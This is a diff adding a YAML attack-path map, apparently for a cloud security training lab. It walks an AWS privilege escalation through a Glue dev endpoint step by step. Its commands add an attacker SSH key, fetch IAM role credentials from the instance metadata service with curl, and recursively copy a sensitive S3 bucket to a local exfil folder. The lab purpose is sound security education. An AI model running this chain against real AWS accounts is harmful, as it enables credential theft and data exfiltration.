@@ -1,0 +1,102 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-glue-002-to-bucket-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has glue:UpdateDevEndpoint permission, allowing it to add SSH
+        public keys to an existing Glue development endpoint that already has a
+        privileged IAM role attached.
+
+    - id: glue-dev-endpoint
+      label: "Glue Dev Endpoint"
+      type: resource
+      subType: glue-job
+      arn: "arn:aws:glue:{region}:{account_id}:devEndpoint/pl-prod-glue-002-to-bucket-endpoint"
+      description: >
+        This pre-existing Glue development endpoint has the target IAM role attached.
+        By adding your SSH public key via glue:UpdateDevEndpoint, you can SSH into this
+        endpoint and access the IAM role credentials through the instance metadata service.
+
+    - id: target-role
+      label: "Target Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-glue-002-to-bucket-target-role"
+      description: >
+        This IAM role is attached to the Glue development endpoint. By SSHing into the
+        endpoint and querying the instance metadata service, you can obtain temporary
+        credentials for this role. The role has s3:GetObject and s3:ListBucket permissions
+        on the sensitive S3 bucket.
+
+    - id: target-bucket
+      label: "Sensitive S3 Bucket"
+      type: resource
+      subType: s3-bucket
+      isTarget: true
+      arn: "arn:aws:s3:::pl-sensitive-data-glue-002-{account_id}-{suffix}"
+      description: >
+        This S3 bucket contains sensitive data and is accessible via the target role
+        attached to the Glue development endpoint. Once you have assumed the role's
+        credentials, you can read objects from this bucket.
+
+  edges:
+    - from: starting-principal
+      to: glue-dev-endpoint
+      label: "glue:UpdateDevEndpoint"
+      description: >
+        Add the attacker's SSH public key to the existing Glue development endpoint.
+        No iam:PassRole is required because the role is already attached to the endpoint.
+      hints:
+        - "You can modify existing Glue development endpoints."
+        - "Look for dev endpoints that already have IAM roles attached with broad S3 permissions."
+        - "Browse to https://pathfinding.cloud/paths/glue-002 for technique details."
+      commands:
+        - description: "Generate an SSH key pair for the attack"
+          command: "ssh-keygen -t rsa -b 2048 -f /tmp/glue-attack-key -N ''"
+        - description: "Retrieve the existing endpoint's name"
+          command: "aws glue get-dev-endpoints --query 'DevEndpoints[*].EndpointName'"
+        - description: "Add the attacker's SSH public key to the endpoint"
+          command: "aws glue update-dev-endpoint --endpoint-name pl-prod-glue-002-to-bucket-endpoint --add-public-keys \"$(cat /tmp/glue-attack-key.pub)\""
+        - description: "Wait for the endpoint to update, then retrieve its public address"
+          command: "aws glue get-dev-endpoint --endpoint-name pl-prod-glue-002-to-bucket-endpoint --query 'DevEndpoint.PublicAddress'"
+
+    - from: glue-dev-endpoint
+      to: target-role
+      label: "SSH + IMDS credential retrieval"
+      description: >
+        SSH into the endpoint using the attacker-controlled private key, then retrieve the
+        attached IAM role credentials from the instance metadata service.
+      hints:
+        - "The endpoint already has a privileged role attached — no PassRole needed."
+        - "After adding your SSH key, connect to the endpoint's public address."
+        - "Retrieve IAM credentials from the instance metadata service once connected."
+      commands:
+        - description: "SSH into the Glue endpoint"
+          command: "ssh -i /tmp/glue-attack-key glue@<endpoint-public-address>"
+        - description: "Retrieve IAM role credentials from instance metadata"
+          command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+    - from: target-role
+      to: target-bucket
+      label: "s3:GetObject, s3:ListBucket"
+      description: >
+        Use the target role's credentials obtained from IMDS to list and download
+        objects from the sensitive S3 bucket.
+      hints:
+        - "You now have the role's temporary credentials — configure them in your environment."
+        - "The role has S3 read permissions on the sensitive bucket."
+      commands:
+        - description: "Export the role credentials"
+          command: "export AWS_ACCESS_KEY_ID=<from-imds> AWS_SECRET_ACCESS_KEY=<from-imds> AWS_SESSION_TOKEN=<from-imds>"
+        - description: "List and download objects from the sensitive bucket"
+          command: "aws s3 ls s3://pl-sensitive-data-glue-002-{account_id}-{suffix}/ && aws s3 cp s3://pl-sensitive-data-glue-002-{account_id}-{suffix}/ /tmp/exfil/ --recursive"
